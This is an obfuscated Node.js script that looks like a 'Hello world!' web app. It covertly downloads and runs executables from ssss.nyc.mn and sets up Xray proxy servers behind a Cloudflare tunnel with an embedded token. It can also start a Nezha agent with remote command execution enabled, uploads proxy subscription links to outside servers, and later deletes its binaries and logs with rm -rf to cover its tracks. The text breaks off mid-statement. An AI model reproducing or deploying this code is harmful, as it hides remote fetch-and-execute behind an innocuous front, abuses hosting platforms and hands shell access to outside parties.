const _0x75151d=_0x88e2;(function(_0xb02d3f,_0x553497){const _0x53ff35=_0x88e2,_0x2efb21=_0xb02d3f();while(!![]){try{const _0x1adecd=-parseInt(_0x53ff35(0x205))/0x1*(parseInt(_0x53ff35(0x24d))/0x2)+-parseInt(_0x53ff35(0x216))/0x3*(-parseInt(_0x53ff35(0x1ea))/0x4)+-parseInt(_0x53ff35(0x250))/0x5+parseInt(_0x53ff35(0x1de))/0x6*(-parseInt(_0x53ff35(0x280))/0x7)+-parseInt(_0x53ff35(0x252))/0x8*(parseInt(_0x53ff35(0x223))/0x9)+parseInt(_0x53ff35(0x288))/0xa*(parseInt(_0x53ff35(0x1d2))/0xb)+-parseInt(_0x53ff35(0x237))/0xc*(-parseInt(_0x53ff35(0x238))/0xd);if(_0x1adecd===_0x553497)break;else _0x2efb21['push'](_0x2efb21['shift']());}catch(_0x1be117){_0x2efb21['push'](_0x2efb21['shift']());}}}(_0x2f3a,0xe463a));const express=require(_0x75151d(0x276)),app=express(),axios=require(_0x75151d(0x20f)),os=require('os'),fs=require('fs'),path=require(_0x75151d(0x203)),{promisify}=require(_0x75151d(0x1e7)),exec=promisify(require(_0x75151d(0x24e))[_0x75151d(0x1d1)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x75151d(0x290)][_0x75151d(0x230)]||'',PROJECT_URL=process[_0x75151d(0x290)][_0x75151d(0x257)]||'',AUTO_ACCESS=process[_0x75151d(0x290)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x75151d(0x290)][_0x75151d(0x22c)]||_0x75151d(0x232),SUB_PATH=process[_0x75151d(0x290)][_0x75151d(0x22e)]||_0x75151d(0x24f),PORT=process[_0x75151d(0x290)][_0x75151d(0x213)]||process[_0x75151d(0x290)]['PORT']||0xbb8,UUID=process[_0x75151d(0x290)][_0x75151d(0x23e)]||'d22e4474-8157-4044-8f4b-6ab034d6d4b3',NEZHA_SERVER=process['env'][_0x75151d(0x23c)]||'',NEZHA_PORT=process[_0x75151d(0x290)][_0x75151d(0x278)]||'',NEZHA_KEY=process['env'][_0x75151d(0x21f)]||'',ARGO_DOMAIN=process[_0x75151d(0x290)][_0x75151d(0x295)]||'penuk.smjm002.dpdns.org',ARGO_AUTH=process[_0x75151d(0x290)][_0x75151d(0x287)]||_0x75151d(0x20d),ARGO_PORT=process['env'][_0x75151d(0x217)]||0x1f41,CFIP=process[_0x75151d(0x290)][_0x75151d(0x1f0)]||_0x75151d(0x25a),CFPORT=process[_0x75151d(0x290)][_0x75151d(0x1d7)]||0x1bb,NAME=process[_0x75151d(0x290)]['NAME']||_0x75151d(0x27f);!fs[_0x75151d(0x251)](FILE_PATH)?(fs[_0x75151d(0x1dd)](FILE_PATH),console[_0x75151d(0x224)](FILE_PATH+_0x75151d(0x209))):console[_0x75151d(0x224)](FILE_PATH+_0x75151d(0x202));function generateRandomName(){const _0xf1b864=_0x75151d,_0x5b6b48=_0xf1b864(0x248);let _0x1c53c1='';for(let _0x1ff3b6=0x0;_0x1ff3b6<0x6;_0x1ff3b6++){_0x1c53c1+=_0x5b6b48[_0xf1b864(0x259)](Math[_0xf1b864(0x1ff)](Math[_0xf1b864(0x200)]()*_0x5b6b48[_0xf1b864(0x25f)]));}return _0x1c53c1;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x75151d(0x1dc)](FILE_PATH,webName),botPath=path[_0x75151d(0x1dc)](FILE_PATH,botName),subPath=path[_0x75151d(0x1dc)](FILE_PATH,_0x75151d(0x265)),listPath=path['join'](FILE_PATH,_0x75151d(0x1e6)),bootLogPath=path[_0x75151d(0x1dc)](FILE_PATH,_0x75151d(0x204)),configPath=path['join'](FILE_PATH,_0x75151d(0x294));function deleteNodes(){const _0x2b478d=_0x75151d;try{if(!UPLOAD_URL)return;if(!fs[_0x2b478d(0x251)](subPath))return;let _0x434360;try{_0x434360=fs['readFileSync'](subPath,_0x2b478d(0x26b));}catch{return null;}const _0x42d92b=Buffer[_0x2b478d(0x1d4)](_0x434360,'base64')[_0x2b478d(0x210)](_0x2b478d(0x26b)),_0x3be25=_0x42d92b[_0x2b478d(0x283)]('\x0a')['filter'](_0x1acd5e=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2b478d(0x27d)](_0x1acd5e));if(_0x3be25['length']===0x0)return;return axios['post'](UPLOAD_URL+'/api/delete-nodes',JSON['stringify']({'nodes':_0x3be25}),{'headers':{'Content-Type':_0x2b478d(0x24a)}})[_0x2b478d(0x218)](_0x9c7b4a=>{return null;}),null;}catch(_0x3e5c7a){return null;}}function cleanupOldFiles(){const _0x12bfce=_0x75151d;try{const _0x391b15=fs[_0x12bfce(0x1f8)](FILE_PATH);_0x391b15[_0x12bfce(0x21a)](_0x5b17b4=>{const _0x188103=_0x12bfce,_0x394f98=path[_0x188103(0x1dc)](FILE_PATH,_0x5b17b4);try{const _0x53c1c5=fs[_0x188103(0x261)](_0x394f98);_0x53c1c5[_0x188103(0x264)]()&&fs[_0x188103(0x274)](_0x394f98);}catch(_0x1bacc8){}});}catch(_0x1e5781){}}app[_0x75151d(0x21d)]('/',function(_0x54ce2c,_0x14a7c3){const _0x5e4cf8=_0x75151d;_0x14a7c3[_0x5e4cf8(0x25b)](_0x5e4cf8(0x1fe));});async function generateConfig(){const _0x50c312=_0x75151d,_0x5dadcc={'log':{'access':'/dev/null','error':_0x50c312(0x260),'loglevel':_0x50c312(0x22b)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x50c312(0x26f),'settings':{'clients':[{'id':UUID,'flow':_0x50c312(0x28b)}],'decryption':_0x50c312(0x22b),'fallbacks':[{'dest':0xbb9},{'path':_0x50c312(0x20c),'dest':0xbba},{'path':_0x50c312(0x1e9),'dest':0xbbb},{'path':_0x50c312(0x233),'dest':0xbbc}]},'streamSettings':{'network':_0x50c312(0x1e8)}},{'port':0xbb9,'listen':_0x50c312(0x281),'protocol':_0x50c312(0x26f),'settings':{'clients':[{'id':UUID}],'decryption':_0x50c312(0x22b)},'streamSettings':{'network':_0x50c312(0x1e8),'security':_0x50c312(0x22b)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x50c312(0x26f),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x50c312(0x22b)},'streamSettings':{'network':'ws','security':_0x50c312(0x22b),'wsSettings':{'path':_0x50c312(0x20c)}},'sniffing':{'enabled':!![],'destOverride':[_0x50c312(0x215),_0x50c312(0x1d8),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x50c312(0x234),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x50c312(0x263)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x50c312(0x281),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x50c312(0x22b),'wsSettings':{'path':_0x50c312(0x233)}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x50c312(0x263)],'metadataOnly':![]}}],'dns':{'servers':[_0x50c312(0x271)]},'outbounds':[{'protocol':_0x50c312(0x1d6),'tag':'direct'},{'protocol':_0x50c312(0x273),'tag':_0x50c312(0x266)}]};fs['writeFileSync'](path['join'](FILE_PATH,_0x50c312(0x294)),JSON[_0x50c312(0x27c)](_0x5dadcc,null,0x2));}function getSystemArchitecture(){const _0x48c28b=_0x75151d,_0x4e4065=os['arch']();return _0x4e4065===_0x48c28b(0x269)||_0x4e4065==='arm64'||_0x4e4065==='aarch64'?_0x48c28b(0x269):_0x48c28b(0x25e);}function downloadFile(_0x35f343,_0x5f224d,_0x2014e9){const _0x55be86=_0x75151d,_0xa54004=_0x35f343;!fs[_0x55be86(0x251)](FILE_PATH)&&fs[_0x55be86(0x1dd)](FILE_PATH,{'recursive':!![]});const _0x241341=fs[_0x55be86(0x279)](_0xa54004);axios({'method':_0x55be86(0x21d),'url':_0x5f224d,'responseType':_0x55be86(0x227)})[_0x55be86(0x236)](_0x526b43=>{const _0x57ca5a=_0x55be86;_0x526b43[_0x57ca5a(0x244)]['pipe'](_0x241341),_0x241341['on'](_0x57ca5a(0x262),()=>{const _0x56074d=_0x57ca5a;_0x241341[_0x56074d(0x267)](),console[_0x56074d(0x224)]('Download\x20'+path['basename'](_0xa54004)+'\x20successfully'),_0x2014e9(null,_0xa54004);}),_0x241341['on']('error',_0x5c99e5=>{const _0x3ee23c=_0x57ca5a;fs['unlink'](_0xa54004,()=>{});const _0x151b41=_0x3ee23c(0x256)+path[_0x3ee23c(0x253)](_0xa54004)+'\x20failed:\x20'+_0x5c99e5[_0x3ee23c(0x214)];console[_0x3ee23c(0x1d5)](_0x151b41),_0x2014e9(_0x151b41);});})[_0x55be86(0x218)](_0x4f3116=>{const _0xf88814=_0x55be86,_0x54fafc=_0xf88814(0x256)+path[_0xf88814(0x253)](_0xa54004)+'\x20failed:\x20'+_0x4f3116[_0xf88814(0x214)];console[_0xf88814(0x1d5)](_0x54fafc),_0x2014e9(_0x54fafc);});}async function downloadFilesAndRun(){const _0x5ccbc9=_0x75151d,_0x42db47=getSystemArchitecture(),_0x47f427=getFilesForArchitecture(_0x42db47);if(_0x47f427[_0x5ccbc9(0x25f)]===0x0){console[_0x5ccbc9(0x224)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x207c1c=_0x47f427[_0x5ccbc9(0x28f)](_0x569491=>{return new Promise((_0x254215,_0x5270f8)=>{const _0x50fc19=_0x88e2;downloadFile(_0x569491[_0x50fc19(0x23d)],_0x569491[_0x50fc19(0x21b)],(_0x227207,_0x598572)=>{_0x227207?_0x5270f8(_0x227207):_0x254215(_0x598572);});});});try{await Promise[_0x5ccbc9(0x1e1)](_0x207c1c);}catch(_0x3df702){console[_0x5ccbc9(0x1d5)](_0x5ccbc9(0x23b),_0x3df702);return;}function _0x4438ad(_0x3d02d6){const _0x3d3672=_0x5ccbc9,_0x31eeff=0x1fd;_0x3d02d6[_0x3d3672(0x21a)](_0x3b194d=>{const _0x116466=_0x3d3672;fs[_0x116466(0x251)](_0x3b194d)&&fs['chmod'](_0x3b194d,_0x31eeff,_0x20d94e=>{const _0x2556bd=_0x116466;_0x20d94e?console[_0x2556bd(0x1d5)](_0x2556bd(0x27b)+_0x3b194d+':\x20'+_0x20d94e):console[_0x2556bd(0x224)](_0x2556bd(0x1e3)+_0x3b194d+':\x20'+_0x31eeff[_0x2556bd(0x210)](0x8));});});}const _0x1fb168=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x4438ad(_0x1fb168);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xd296e7=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')[_0x5ccbc9(0x289)]():'',_0x93fd7f=new Set([_0x5ccbc9(0x27e),_0x5ccbc9(0x1f4),_0x5ccbc9(0x21e),_0x5ccbc9(0x221),_0x5ccbc9(0x275),_0x5ccbc9(0x1e2)]),_0x31bb47=_0x93fd7f[_0x5ccbc9(0x245)](_0xd296e7)?_0x5ccbc9(0x235):_0x5ccbc9(0x24c),_0xba4a73=_0x5ccbc9(0x228)+NEZHA_KEY+_0x5ccbc9(0x229)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x31bb47+_0x5ccbc9(0x23f)+UUID;fs[_0x5ccbc9(0x258)](path[_0x5ccbc9(0x1dc)](FILE_PATH,_0x5ccbc9(0x239)),_0xba4a73);const _0xdba638=_0x5ccbc9(0x243)+phpPath+_0x5ccbc9(0x242)+FILE_PATH+_0x5ccbc9(0x282);try{await exec(_0xdba638),console[_0x5ccbc9(0x224)](phpName+'\x20is\x20running'),await new Promise(_0x274f55=>setTimeout(_0x274f55,0x3e8));}catch(_0xfd9668){console[_0x5ccbc9(0x1d5)](_0x5ccbc9(0x297)+_0xfd9668);}}else{let _0x19454d='';const _0x1ff1fa=[_0x5ccbc9(0x27e),_0x5ccbc9(0x1f4),'2096',_0x5ccbc9(0x221),_0x5ccbc9(0x275),_0x5ccbc9(0x1e2)];_0x1ff1fa[_0x5ccbc9(0x1df)](NEZHA_PORT)&&(_0x19454d=_0x5ccbc9(0x20a));const _0x3b26cf=_0x5ccbc9(0x243)+npmPath+_0x5ccbc9(0x1e0)+NEZHA_SERVER+':'+NEZHA_PORT+_0x5ccbc9(0x246)+NEZHA_KEY+'\x20'+_0x19454d+_0x5ccbc9(0x299);try{await exec(_0x3b26cf),console[_0x5ccbc9(0x224)](npmName+_0x5ccbc9(0x226)),await new Promise(_0x3c5067=>setTimeout(_0x3c5067,0x3e8));}catch(_0x16caac){console[_0x5ccbc9(0x1d5)](_0x5ccbc9(0x1fb)+_0x16caac);}}}else console['log'](_0x5ccbc9(0x28e));const _0x5b7776='nohup\x20'+webPath+_0x5ccbc9(0x201)+FILE_PATH+_0x5ccbc9(0x1ed);try{await exec(_0x5b7776),console[_0x5ccbc9(0x224)](webName+'\x20is\x20running'),await new Promise(_0x5a0ffb=>setTimeout(_0x5a0ffb,0x3e8));}catch(_0x4bf069){console['error']('web\x20running\x20error:\x20'+_0x4bf069);}if(fs[_0x5ccbc9(0x251)](botPath)){let _0x15272b;if(ARGO_AUTH[_0x5ccbc9(0x26d)](/^[A-Z0-9a-z=]{120,250}$/))_0x15272b=_0x5ccbc9(0x1f6)+ARGO_AUTH;else ARGO_AUTH[_0x5ccbc9(0x26d)](/TunnelSecret/)?_0x15272b='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x5ccbc9(0x28a):_0x15272b=_0x5ccbc9(0x1d9)+FILE_PATH+_0x5ccbc9(0x1ef)+ARGO_PORT;try{await exec(_0x5ccbc9(0x243)+botPath+'\x20'+_0x15272b+'\x20>/dev/null\x202>&1\x20&'),console[_0x5ccbc9(0x224)](botName+_0x5ccbc9(0x226)),await new Promise(_0x620db9=>setTimeout(_0x620db9,0x7d0));}catch(_0x2034ca){console[_0x5ccbc9(0x1d5)](_0x5ccbc9(0x231)+_0x2034ca);}}await new Promise(_0x1a7e94=>setTimeout(_0x1a7e94,0x1388));}function getFilesForArchitecture(_0x39117e){const _0x440e2f=_0x75151d;let _0x1012ae;_0x39117e===_0x440e2f(0x269)?_0x1012ae=[{'fileName':webPath,'fileUrl':_0x440e2f(0x219)},{'fileName':botPath,'fileUrl':_0x440e2f(0x286)}]:_0x1012ae=[{'fileName':webPath,'fileUrl':_0x440e2f(0x1fa)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x2a3a1c=_0x39117e==='arm'?'https://arm64.ssss.nyc.mn/agent':_0x440e2f(0x222);_0x1012ae[_0x440e2f(0x1f1)]({'fileName':npmPath,'fileUrl':_0x2a3a1c});}else{const _0x250926=_0x39117e==='arm'?'https://arm64.ssss.nyc.mn/v1':_0x440e2f(0x26e);_0x1012ae['unshift']({'fileName':phpPath,'fileUrl':_0x250926});}}return _0x1012ae;}function argoType(){const _0x2c2739=_0x75151d;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x2c2739(0x224)](_0x2c2739(0x249));return;}if(ARGO_AUTH['includes'](_0x2c2739(0x211))){fs[_0x2c2739(0x258)](path[_0x2c2739(0x1dc)](FILE_PATH,_0x2c2739(0x1f7)),ARGO_AUTH);const _0xe98563=_0x2c2739(0x27a)+ARGO_AUTH[_0x2c2739(0x283)]('\x22')[0xb]+_0x2c2739(0x285)+path[_0x2c2739(0x1dc)](FILE_PATH,_0x2c2739(0x1f7))+_0x2c2739(0x22f)+ARGO_DOMAIN+_0x2c2739(0x240)+ARGO_PORT+_0x2c2739(0x22d);fs['writeFileSync'](path[_0x2c2739(0x1dc)](FILE_PATH,_0x2c2739(0x21c)),_0xe98563);}else console['log'](_0x2c2739(0x207));}function _0x2f3a(){const _0x14d6e5=['abcdefghijklmnopqrstuvwxyz','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','application/json','\x0a\x0atrojan://','false','4sZNBBO','child_process','sub','703170yguxvy','existsSync','122104LMBgUj','basename','\x0a\x20\x20\x20\x20','firefox','Download\x20','PROJECT_URL','writeFileSync','charAt','cdns.doon.eu.org','send','substring','\x20>/dev/null\x202>&1\x20&','amd','length','/dev/null','statSync','finish','quic','isFile','sub.txt','block','close','readFileSync','arm','clear','utf-8','&path=%2Ftrojan-argo%3Fed%3D2560#','match','https://amd64.ssss.nyc.mn/v1','vless','\x0avless://','https+local://8.8.8.8/dns-query','http\x20server\x20is\x20running\x20on\x20port:','blackhole','unlinkSync','2083','express','status','NEZHA_PORT','createWriteStream','\x0a\x20\x20tunnel:\x20','Empowerment\x20failed\x20for\x20','stringify','test','443','penuk','9867914dRsUCI','127.0.0.1','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','split','\x20>/dev/null\x202>&1','\x0a\x20\x20credentials-file:\x20','https://arm64.ssss.nyc.mn/bot','ARGO_AUTH','2360GlUtpk','pop','/tunnel.yml\x20run','xtls-rprx-vision','App\x20is\x20running','http://ip-api.com/json/','NEZHA\x20variable\x20is\x20empty,skip\x20running','map','env','Content-Type','Subscription\x20uploaded\x20successfully','post','config.json','ARGO_DOMAIN','base64','php\x20running\x20error:\x20','rm\x20-rf\x20','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','https://ipapi.co/json/','exec','82148pESjHk','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','from','error','freedom','CFPORT','tls','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','del\x20/f\x20/q\x20','response','join','mkdirSync','6vrmQNE','includes','\x20-s\x20','all','2053','Empowerment\x20success\x20for\x20','Add\x20automatic\x20access\x20task\x20faild:\x20','/vmess-argo?ed=2560','list.txt','util','tcp','/vmess-argo','199372XAPmWj','win32','Unknown','/config.json\x20>/dev/null\x202>&1\x20&','success','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','CFIP','unshift','Nodes\x20uploaded\x20successfully','ArgoDomain:','8443','/api/add-subscriptions','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','tunnel.json','readdirSync','filter','https://amd64.ssss.nyc.mn/web','npm\x20running\x20error:\x20','country_code','?encryption=none&security=tls&sni=','Hello\x20world!','floor','random','\x20-c\x20','\x20already\x20exists','path','boot.log','876748SIZsQw','Error\x20reading\x20boot.log:','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','org','\x20is\x20created','--tls','push','/vless-argo','eyJhIjoiZDgzMGZmY2E1ODIwMWQxNzRmM2JmMzQ2NDU5ZDI4OGUiLCJ0IjoiZmUzODZkNzUtYzQ1Ny00ZTM0LWJlNzQtY2QyZDVhNjQ0YzAxIiwicyI6Ik5tVXdNell5WTJRdFpETTJZaTAwTkdGaExUZzRPVFV0WXpkaU16UXpORE16WkRFMCJ9','&path=%2Fvless-argo%3Fed%3D2560#','axios','toString','TunnelSecret','ARGO_DOMAIN:','SERVER_PORT','message','http','72NklxyH','ARGO_PORT','catch','https://arm64.ssss.nyc.mn/web','forEach','fileUrl','tunnel.yml','get','2096','NEZHA_KEY','https://oooo.serv00.net/add-url','2087','https://amd64.ssss.nyc.mn/agent','549HVulck','log','&fp=firefox&type=ws&host=','\x20is\x20running','stream','\x0aclient_secret:\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','/api/add-nodes','none','FILE_PATH','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','SUB_PATH','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','UPLOAD_URL','Error\x20executing\x20command:\x20','./tmp','/trojan-argo','vmess','true','then','2041548amHpxt','169RSAPCY','config.yaml','\x0a\x0avmess://','Error\x20downloading\x20files:','NEZHA_SERVER','fileName','UUID','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','platform','\x20-c\x20\x22','nohup\x20','data','has','\x20-p\x20','countryCode'];_0x2f3a=function(){return _0x14d6e5;};return _0x2f3a();}async function extractDomains(){const _0x7abbab=_0x75151d;let _0x7bfa50;if(ARGO_AUTH&&ARGO_DOMAIN)_0x7bfa50=ARGO_DOMAIN,console[_0x7abbab(0x224)](_0x7abbab(0x212),_0x7bfa50),await _0xf44fe9(_0x7bfa50);else try{const _0x4c90b2=fs[_0x7abbab(0x268)](path[_0x7abbab(0x1dc)](FILE_PATH,_0x7abbab(0x204)),_0x7abbab(0x26b)),_0x5d5c62=_0x4c90b2[_0x7abbab(0x283)]('\x0a'),_0x380668=[];_0x5d5c62[_0x7abbab(0x21a)](_0x1310c7=>{const _0x4c08eb=_0x7abbab,_0x139b72=_0x1310c7[_0x4c08eb(0x26d)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x139b72){const _0x4e0e49=_0x139b72[0x1];_0x380668['push'](_0x4e0e49);}});if(_0x380668[_0x7abbab(0x25f)]>0x0)_0x7bfa50=_0x380668[0x0],console['log'](_0x7abbab(0x1f3),_0x7bfa50),await _0xf44fe9(_0x7bfa50);else{console[_0x7abbab(0x224)](_0x7abbab(0x1d3)),fs['unlinkSync'](path[_0x7abbab(0x1dc)](FILE_PATH,'boot.log'));async function _0x13828f(){const _0x1bdfe9=_0x7abbab;try{process[_0x1bdfe9(0x241)]===_0x1bdfe9(0x1eb)?await exec('taskkill\x20/f\x20/im\x20'+botName+'.exe\x20>\x20nul\x202>&1'):await exec('pkill\x20-f\x20\x22['+botName['charAt'](0x0)+']'+botName[_0x1bdfe9(0x25c)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x55e297){}}_0x13828f(),await new Promise(_0xe57267=>setTimeout(_0xe57267,0xbb8));const _0x514e02=_0x7abbab(0x1d9)+FILE_PATH+_0x7abbab(0x1ef)+ARGO_PORT;try{await exec(_0x7abbab(0x243)+botPath+'\x20'+_0x514e02+_0x7abbab(0x25d)),console[_0x7abbab(0x224)](botName+_0x7abbab(0x226)),await new Promise(_0x55161c=>setTimeout(_0x55161c,0xbb8)),await extractDomains();}catch(_0x2a1241){console[_0x7abbab(0x1d5)]('Error\x20executing\x20command:\x20'+_0x2a1241);}}}catch(_0x4cfbfb){console[_0x7abbab(0x1d5)](_0x7abbab(0x206),_0x4cfbfb);}async function _0x704590(){const _0x48170b=_0x7abbab;try{const _0x1fcb75=await axios[_0x48170b(0x21d)](_0x48170b(0x29a),{'timeout':0xbb8});if(_0x1fcb75['data']&&_0x1fcb75[_0x48170b(0x244)]['country_code']&&_0x1fcb75[_0x48170b(0x244)][_0x48170b(0x208)])return _0x1fcb75['data'][_0x48170b(0x1fc)]+'_'+_0x1fcb75[_0x48170b(0x244)]['org'];}catch(_0x4ee005){try{const _0x23e21b=await axios['get'](_0x48170b(0x28d),{'timeout':0xbb8});if(_0x23e21b[_0x48170b(0x244)]&&_0x23e21b[_0x48170b(0x244)][_0x48170b(0x277)]===_0x48170b(0x1ee)&&_0x23e21b[_0x48170b(0x244)][_0x48170b(0x247)]&&_0x23e21b['data'][_0x48170b(0x208)])return _0x23e21b[_0x48170b(0x244)][_0x48170b(0x247)]+'_'+_0x23e21b[_0x48170b(0x244)][_0x48170b(0x208)];}catch(_0xf85a24){}}return _0x48170b(0x1ec);}async function _0xf44fe9(_0x1fa34f){const _0x175045=await _0x704590(),_0xa36a30=NAME?NAME+'-'+_0x175045:_0x175045;return new Promise(_0x148342=>{setTimeout(()=>{const _0x524f25=_0x88e2,_0x496d4d={'v':'2','ps':''+_0xa36a30,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x524f25(0x22b),'net':'ws','type':'none','host':_0x1fa34f,'path':_0x524f25(0x1e5),'tls':_0x524f25(0x1d8),'sni':_0x1fa34f,'alpn':'','fp':_0x524f25(0x255)},_0x3ffe4d=_0x524f25(0x270)+UUID+'@'+CFIP+':'+CFPORT+_0x524f25(0x1fd)+_0x1fa34f+_0x524f25(0x225)+_0x1fa34f+_0x524f25(0x20e)+_0xa36a30+_0x524f25(0x23a)+Buffer[_0x524f25(0x1d4)](JSON[_0x524f25(0x27c)](_0x496d4d))[_0x524f25(0x210)](_0x524f25(0x296))+_0x524f25(0x24b)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x1fa34f+'&fp=firefox&type=ws&host='+_0x1fa34f+_0x524f25(0x26c)+_0xa36a30+_0x524f25(0x254);console['log'](Buffer['from'](_0x3ffe4d)[_0x524f25(0x210)](_0x524f25(0x296))),fs[_0x524f25(0x258)](subPath,Buffer[_0x524f25(0x1d4)](_0x3ffe4d)[_0x524f25(0x210)](_0x524f25(0x296))),console[_0x524f25(0x224)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x524f25(0x21d)]('/'+SUB_PATH,(_0x3a825c,_0x10c8b8)=>{const _0x12d34=_0x524f25,_0x1872f0=Buffer['from'](_0x3ffe4d)[_0x12d34(0x210)](_0x12d34(0x296));_0x10c8b8['set'](_0x12d34(0x291),'text/plain;\x20charset=utf-8'),_0x10c8b8[_0x12d34(0x25b)](_0x1872f0);}),_0x148342(_0x3ffe4d);},0x7d0);});}}function _0x88e2(_0x21aab7,_0x599133){_0x21aab7=_0x21aab7-0x1d1;const _0x2f3afb=_0x2f3a();let _0x88e2f2=_0x2f3afb[_0x21aab7];return _0x88e2f2;}async function uploadNodes(){const _0x15cf68=_0x75151d;if(UPLOAD_URL&&PROJECT_URL){const _0x1816c0=PROJECT_URL+'/'+SUB_PATH,_0x4dd6de={'subscription':[_0x1816c0]};try{const _0x2cc0fd=await axios[_0x15cf68(0x293)](UPLOAD_URL+_0x15cf68(0x1f5),_0x4dd6de,{'headers':{'Content-Type':_0x15cf68(0x24a)}});return _0x2cc0fd&&_0x2cc0fd[_0x15cf68(0x277)]===0xc8?(console[_0x15cf68(0x224)](_0x15cf68(0x292)),_0x2cc0fd):null;}catch(_0x13e28b){if(_0x13e28b[_0x15cf68(0x1db)]){if(_0x13e28b[_0x15cf68(0x1db)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x15cf68(0x251)](listPath))return;const _0x2fd0da=fs[_0x15cf68(0x268)](listPath,'utf-8'),_0x970ea2=_0x2fd0da[_0x15cf68(0x283)]('\x0a')[_0x15cf68(0x1f9)](_0x1b4709=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x15cf68(0x27d)](_0x1b4709));if(_0x970ea2['length']===0x0)return;const _0x5ab207=JSON[_0x15cf68(0x27c)]({'nodes':_0x970ea2});try{const _0x217510=await axios[_0x15cf68(0x293)](UPLOAD_URL+_0x15cf68(0x22a),_0x5ab207,{'headers':{'Content-Type':_0x15cf68(0x24a)}});return _0x217510&&_0x217510['status']===0xc8?(console[_0x15cf68(0x224)](_0x15cf68(0x1f2)),_0x217510):null;}catch(_0xf1446a){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x2a5bdd=_0x88e2,_0x3c3679=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x3c3679['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x3c3679[_0x2a5bdd(0x20b)](phpPath);process['platform']===_0x2a5bdd(0x1eb)?exec(_0x2a5bdd(0x1da)+_0x3c3679['join']('\x20')+'\x20>\x20nul\x202>&1',_0x54bc0e=>{const _0xecc8ae=_0x2a5bdd;console[_0xecc8ae(0x26a)](),console['log']('App\x20is\x20running'),console[_0xecc8ae(0x224)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x2a5bdd(0x298)+_0x3c3679[_0x2a5bdd(0x1dc)]('\x20')+_0x2a5bdd(0x284),_0x300369=>{const _0x2799d4=_0x2a5bdd;console[_0x2799d4(0x26a)](),console[_0x2799d4(0x224)](_0x2799d4(0x28c)),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x23fc8c=_0x75151d;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x23fc8c(0x224)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x2b2a5c=await axios['post'](_0x23fc8c(0x220),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x23fc8c(0x24a)}});return console[_0x23fc8c(0x224)]('automatic\x20access\x20task\x20added\x20successfully'),_0x2b2a5c;}catch(_0x5214e2){return console[_0x23fc8c(0x1d5)](_0x23fc8c(0x1e4)+_0x5214e2['message']),null;}}async function startserver(){const _0x546773=_0x75151d;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await 